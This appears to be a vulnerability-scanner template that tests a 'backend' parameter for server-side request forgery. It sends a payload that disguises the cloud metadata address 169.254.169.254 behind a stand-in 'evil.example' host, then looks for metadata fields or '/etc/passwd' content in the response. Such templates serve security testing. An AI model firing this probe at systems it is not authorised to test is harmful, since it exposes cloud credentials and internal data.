id: ssrf5-0498
name: 'SSRF probe in backend'
severity: high
type: active
tags:
  - ssrf
  - oob
  - cloud
description: 'Fetches internal URL via backend (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      backend:
        - 'http://evil.example@169.254.169.254/'
    matchers:
      - type: word
        part: body
        words:
          - 'ami-id'
          - 'instance-id'
          - 'metadata'
          - 'root:x:0:0'
          - 'PONG'
